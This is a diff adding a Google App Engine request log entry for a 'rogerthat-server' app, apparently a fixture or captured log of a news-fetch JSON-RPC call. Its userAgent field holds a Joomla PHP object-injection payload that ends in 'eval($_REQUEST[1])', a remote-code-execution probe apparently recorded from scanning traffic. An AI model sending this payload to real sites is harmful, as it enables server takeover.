@@ -1,0 +1,77 @@
+{
+  "httpRequest": {
+    "status": 200
+  },
+  "insertId": "5bb3205800082632e289e0c8",
+  "labels": {
+    "clone_id": "00c61b117caa9676063ac181182c626643fc03a41440ea55f660c77199dc0315bfffb5c7"
+  },
+  "logName": "projects/rogerthat-server/logs/appengine.googleapis.com%2Frequest_log",
+  "operation": {
+    "first": true,
+    "id": "5bb3205700ff0ae47e4f3b5d5f0001657e726f676572746861742d7365727665720001323031383039323874313034303038000100",
+    "last": true,
+    "producer": "appengine.googleapis.com/request_id"
+  },
+  "protoPayload": {
+    "@type": "type.googleapis.com/google.appengine.logging.v1.RequestLog",
+    "appEngineRelease": "1.9.64",
+    "appId": "e~rogerthat-server",
+    "cost": 3.2520999999999997e-08,
+    "endTime": "2018-10-02T07:38:00.445164Z",
+    "finished": true,
+    "first": true,
+    "host": "rogerthat-server.appspot.com",
+    "httpVersion": "HTTP/1.1",
+    "instanceId": "00c61b117caa9676063ac181182c626643fc03a41440ea55f660c77199dc0315bfffb5c7",
+    "instanceIndex": -1,
+    "ip": "195.130.155.140",
+    "latency": "0.731310s",
+    "line": [
+      {
+        "logMessage": "[XX-SLOGv1] {\"a\":{\"type_\":\"user\"},\"_dc\":\"eu6\",\"e\":\"someone@gmail.com:be-herentals\",\"f\":\"request_identification\",\"_t\":47588941141760,\"m\":\"Request identification\",\"T\":\"Tue, 02 Oct 2018 07:37:59.759\",\"_i\":\"00c61b117caa9676063ac181182c626643fc03a41440ea55f660c77199dc0315bfffb5c7\",\"_c\":\"BE\",\"t\":1538465879.759739}",
+        "severity": "INFO",
+        "time": "2018-10-02T07:37:59.759954Z"
+      },
+      {
+        "logMessage": "Request identity: someone@gmail.com:be-herentals (ios)",
+        "severity": "INFO",
+        "time": "2018-10-02T07:37:59.760147Z"
+      },
+      {
+        "logMessage": "Incoming HTTP call from 3348dbe3-b788-11e8-b849-4b63092c392c@rogerth.at",
+        "severity": "INFO",
+        "time": "2018-10-02T07:37:59.760843Z"
+      },
+      {
+        "logMessage": "[XX-OFFLOADv1]{\"timestamp\":1538465880.443679,\"request_data\":{\"a\":[\"70f706ef-05f8-4335-a6e7-5660637773b4\"],\"c\":[{\"a\":{\"request\":{\"cursor\":\"*****\",\"updated_since\":1538068115}},\"ci\":\"1fc470e3-1a76-41ef-83fa-4e765e7b2665\",\"f\":\"com.mobicage.api.news.getNews\",\"t\":1538465878,\"av\":1}],\"r\":[],\"av\":1},\"type\":\"app\",\"response_data\":{\"ap\":\"https://rogerthat-server.appspot.com/json-rpc\",\"r\":[{\"s\":\"success\",\"r\":{\"cursor\":null,\"result\":[]},\"av\":1,\"ci\":\"1fc470e3-1a76-41ef-83fa-4e765e7b2665\",\"t\":1538465878}],\"av\":1,\"t\":1538465880,\"more\":false},\"user\":\"295917a19fd6d6c320e67a36896d3656:be-herentals\"}",
+        "severity": "INFO",
+        "time": "2018-10-02T07:38:00.443779Z"
+      }
+    ],
+    "megaCycles": "138",
+    "method": "POST",
+    "requestId": "5bb3205700ff0ae47e4f3b5d5f0001657e726f676572746861742d7365727665720001323031383039323874313034303038000100",
+    "resource": "/json-rpc",
+    "responseSize": "291",
+    "startTime": "2018-10-02T07:37:59.713854Z",
+    "status": 200,
+    "traceId": "4dde30b21b31556784d4dde360633812",
+    "urlMapEntry": "rogerthat_unauthenticated.app",
+    "userAgent": "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:46:\"eval($_REQUEST[1]);JFactory::getConfig();exit;\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}\ud834\udf06",
+    "versionId": "20180928t104008"
+  },
+  "receiveTimestamp": "2018-10-02T07:38:00.535857259Z",
+  "resource": {
+    "labels": {
+      "module_id": "default",
+      "project_id": "rogerthat-server",
+      "version_id": "20180928t104008",
+      "zone": "eu6"
+    },
+    "type": "gae_app"
+  },
+  "severity": "INFO",
+  "timestamp": "2018-10-02T07:37:59.713854Z",
+  "trace": "projects/rogerthat-server/traces/4dde30b21b31556784d4dde360633812"
+}
